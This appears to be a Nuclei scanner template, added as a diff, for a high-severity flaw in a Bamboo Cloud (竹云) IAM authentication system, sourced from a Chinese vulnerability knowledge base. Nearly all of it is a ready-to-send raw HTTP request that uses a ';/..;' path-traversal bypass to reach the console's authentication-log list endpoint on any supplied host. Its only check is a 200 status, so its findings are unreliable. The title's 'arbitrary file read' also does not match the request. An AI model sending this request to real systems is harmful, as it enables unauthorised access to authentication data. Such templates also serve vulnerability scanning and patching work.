@@ -1,0 +1,27 @@
+id: poc-zee2skva15o316sl
+info:
+  name: 竹云iam认证系统list存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zee2skva15o316sl'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zee2skva15o316sl
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /apphub/images/aa;/..;/..;/console/auth_log/list HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.2412.60 Safari/537.36
+
+    Connection: close
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
